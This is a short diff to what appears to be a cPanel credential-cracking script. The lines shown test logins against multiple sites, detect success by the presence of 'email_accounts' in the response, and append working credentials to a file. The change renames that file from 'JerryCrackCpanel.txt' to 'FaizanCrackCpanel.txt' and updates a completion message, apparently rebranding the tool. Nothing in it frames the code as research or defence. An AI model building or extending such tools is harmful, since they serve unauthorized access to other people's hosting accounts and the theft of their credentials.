@@ -50,7 +50,7 @@ try:
 
                 if "email_accounts" in response.text:
                     print(f" {fg}[+] Login successful{Style.RESET_ALL}")
-                    with open("JerryCrackCpanel.txt", "a") as out:
+                    with open("FaizanCrackCpanel.txt", "a") as out:
                         out.write(f"{data_cpanel}\n")
                 else:
                     print(f" {fr}[-] Login Failed {Style.RESET_ALL}")
@@ -66,4 +66,4 @@ except FileNotFoundError:
 except Exception as ex:
     print(f" [!] An error occurred: {ex}")
 finally:
-    print("Finished processing sites.")
+    print("Finished processing sites Saved As FaizanCrackCpanel.txt in your file manager")
